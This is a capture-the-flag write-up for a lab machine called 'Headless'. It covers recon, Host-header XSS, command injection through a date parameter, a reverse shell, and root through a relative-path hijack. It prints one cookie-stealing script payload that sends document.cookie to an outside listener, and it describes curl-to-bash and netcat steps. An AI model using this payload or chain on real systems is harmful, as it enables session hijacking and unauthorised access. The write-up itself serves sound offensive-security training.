# Headless

### Recon

- open ports:
    - ssh\22 - OpenSSH 9.2p1 Debian 2+deb12u2
    - http\5000
    - OS: Linux

There is a form on /support

![image.png](image.png)

and forbidden page on /dashboard (I used gobuster to find it)

![image.png](image%201.png)

**admin cookie header**

I noticed cookie header is_admin, the first part is base64 encoded word “user”, I tried changing to admin, but to no avail, haven’t been able to crack the second part

![image.png](image%202.png)

**XSS**

I tried some XSS scripts and checking for SSTI, the sites behaves normally every time except when the payload is inserted into the message box. Then the site reflects user’s request

![image.png](image%203.png)

I tried changing the host header in my request to `<script>alert(1)</script>`, I used <> because these characters fire up the reflection

![image.png](image%204.png)

XSS!!!!

![image.png](image%205.png)

**Stealing admin cookie**

Inserting `<script> var i=new Image(); i.src=”http://10.10.16.11:8001/?cookies=”+document.cookie;</script>`

![image.png](image%206.png)

Setting up a listener, connection comes through, getting the admin cookie

![image.png](image%207.png)

**Getting shell (command injection)**

I copied the stolen cookie into the is_admin paramater and got admin access

![image.png](image%208.png)

![image.png](image%209.png)

after catching the request for generating report, I saw the weird date paramater on the bottom

![image.png](image%2010.png)

I put a semicolon after the date and tried whoami and it worked!

![Snímek obrazovky 2024-11-04 195620.png](Snmek_obrazovky_2024-11-04_195620.png)

creating a reverse shell payload, setting up listener for downloading the shell and netcat listener for the reverse shell itself

![image.png](image%2011.png)

![image.png](image%2012.png)

sending curl piped to bash

![image.png](image%2013.png)

and I got a shell as user 

![image.png](image%2014.png)

I stabilise the shell with stty/script trick

### Getting root

user dvir can run /usr/bin/syscheck

![image.png](image%2015.png)

there is vulnerability syscheck program doesn’t specify the whole path to [intidb.sh](http://intidb.sh) when executing it, so I can create my own intidb.sh in the directory I am now and get the root through it

![image.png](image%2016.png)

![image.png](image%2017.png)

I set up a listener netcat and after running syscheck I got the root shell!!

![image.png](image%2018.png)
